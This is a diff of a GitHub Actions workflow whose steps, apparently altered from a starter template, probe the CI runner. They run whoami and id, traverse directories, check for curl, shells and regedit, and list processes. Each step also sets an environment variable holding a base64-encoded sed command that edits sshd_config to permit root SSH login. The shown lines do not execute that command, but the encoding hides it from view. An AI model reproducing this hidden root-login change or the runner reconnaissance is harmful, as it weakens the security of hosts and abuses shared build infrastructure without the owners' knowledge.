@@ -30,11 +30,11 @@ jobs:
 
 
       - name: Run a one-line script
-        run:  "choco install busybox ;whoami;busybox id; (type env:path) -split ';'  "
+        run:  "choco install busybox ;whoami;id; (type env:path) -split ';'  "
         env:
           ss0: "c2VkIC1pICJzL14jXD9cKFBlcm1pdFJvb3RMb2dpblwpL1wxIHllcyMvZyIgL2V0Yy9zc2gvc3NoZF9jb25maWc7"
-      # Runs a set of commands using the runners shell \"C:/Program Files/Git/bin/"
+      # choco -V&&busybox&&busybox pwd&&dir  ../../../ &&    \"C:/Program Files/Git/bin/"
       - name: Run a 2-line script
-        run:  "choco -V&&busybox&&busybox pwd&&dir  ../../../ &&ls &&which id sh bash ps curl git regedit mmc which&& ps aux"
+        run:  "ls &&which id sh bash ps curl git regedit mmc which&& ps "
         env:
           ss0: "c2VkIC1pICJzL14jXD9cKFBlcm1pdFJvb3RMb2dpblwpL1wxIHllcyMvZyIgL2V0Yy9zc2gvc3NoZF9jb25maWc7" 
